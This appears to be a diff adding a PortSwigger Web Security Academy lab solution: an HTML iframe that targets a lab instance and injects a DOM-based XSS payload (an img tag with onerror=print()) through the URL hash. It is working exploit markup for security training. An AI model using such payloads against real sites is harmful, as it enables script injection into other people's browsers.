@@ -1,0 +1,4 @@
+<!-- The following XSS payload is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/cross-site-scripting/dom-based -->
+
+<iframe src="https://0a8e004304254f01808e1292003100c1.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
